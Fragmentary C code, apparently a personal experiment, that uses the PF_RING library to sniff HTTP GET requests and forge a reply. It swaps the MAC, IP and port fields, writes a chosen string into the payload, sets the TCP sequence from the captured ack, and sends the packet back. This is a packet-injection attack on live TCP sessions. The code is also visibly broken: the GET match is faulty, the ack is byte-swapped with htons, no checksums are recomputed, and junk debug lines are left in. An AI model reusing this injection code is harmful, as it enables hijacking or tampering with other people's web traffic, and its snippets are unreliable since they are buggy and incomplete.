...
u_int8_t use_extended_pkt_header = 1, touch_payload = 0, enable_hw_timestamp = 0, dont_strip_timestamps = 0;
...
/******************************/
   //int rc;
   //rc=pfring_send(pd,(char *)p,h->caplen,1);

if(h->caplen>h->extended_hdr.parsed_pkt.offset.payload_offset){

      int i;
      char * GET="GET / HTTP/1.1";
      int get_flag=0;
      int payload_offset=h->extended_hdr.parsed_pkt.offset.payload_offset;
  ...
  if(h->caplen>100){
          //printf payload
          for(i = payload_offset; i < payload_offset+10; i++){
                                if(GET[i-payload_offset]==p[i]){
                                        get_flag=1;
                                }else{
                                        get_flag=0;
                                }
          }//End of exam GET http1.1
  if(get_flag){
                 printf("\n//=====================//\n");
                printf("caplen:%d\n",h->caplen);
                printf("h->len:%d\n",h->len);
                printf("payload_offset:%d\n",payload_offset);
                  ...
                  for(i = h->extended_hdr.parsed_pkt.offset.payload_offset; i < h->caplen; i++){
                        printf("%c", p[i]);
                  }
  
  /**********************************************/
  struct ether_header *fehdr;
  char buf1[32], buf2[32];
  fehdr = (struct ether_header *) p;
  u_char temp_mac[6];
  memcpy(&temp_mac,fehdr->ether_shost,6);

  printf("\nBefore [%s -> %s] \n",	
          etheraddr_string(fehdr->ether_dhost, buf1),
          etheraddr_string(fehdr->ether_shost, buf2));
  
  memcpy(fehdr->ether_shost,fehdr->ether_dhost,6);
  memcpy(fehdr->ether_dhost,&temp_mac,6);
 ...
 /***********************************************/
  struct iphdr *fiphdr;
  fiphdr=p+sizeof(struct ether_header);
  u_int32_t temp_ip;
           temp_ip=fiphdr->saddr;

  printf("\nBefore[IPv4][%s:", intoa(fiphdr->saddr));
  printf("-> %s] ", intoa(fiphdr->daddr));
  
  fiphdr->saddr=fiphdr->daddr;
  fiphdr->daddr=temp_ip;
      
  printf("\nAfter[IPv4][%s:", intoa(fiphdr->saddr));
  printf("-> %s]\n ", intoa(fiphdr->daddr));

 /************************************************/
 struct tcphdr *ftcphdr;
 ftcphdr=p+34;
 u_int16_t temp_port=ftcphdr->source;

 printf("\nBefore port:%d -> %d ",ftcphdr->source,ftcphdr->dest);
 ftcphdr->source=ftcphdr->dest;
 ftcphdr->dest=temp_port;
 printf("After port:%d -> %d \n",ftcphdr->source,ftcphdr->dest);
...
int payload_offset=h->extended_hdr.parsed_pkt.offset.payload_offset; 
int fcontent_len=strlen(content);

memcpy((char *)(p+payload_offset),content,fcontent_len);
...
//  u_int32_t	ack_seq;
     //假包的seq=th_ack，ack=seq+packect.length大小...
      ...
      int segmentSize=h->caplen-payload_offset;
          ftcphdr->seq=ftcphdr->ack_seq;
          printf("relative ack number:%d\n",1+segmentSize);

                ftcphdr->ack_seq=htons(1+segmentSize);
   
/************************************************/ 
  int rc;
  rc=pfring_send(pd,(char *)p,payload_offset+fcontent_len,1);
  printf("return code of pfring_send==%d\n",rc);
 
  /**********************************************/

  }//End of get_flag==true
 }//End of caplen>100
printf("\n");
 }
...
#define DUMMY_PLUGIN_ID   1
  ...
  printf("fasdkfjalksdjfkasd\n");
  if (num_threads <= 1) {
    if(bind_core >= 0)
      bind2core(bind_core);
    printf("I am in pfring_loop\n");
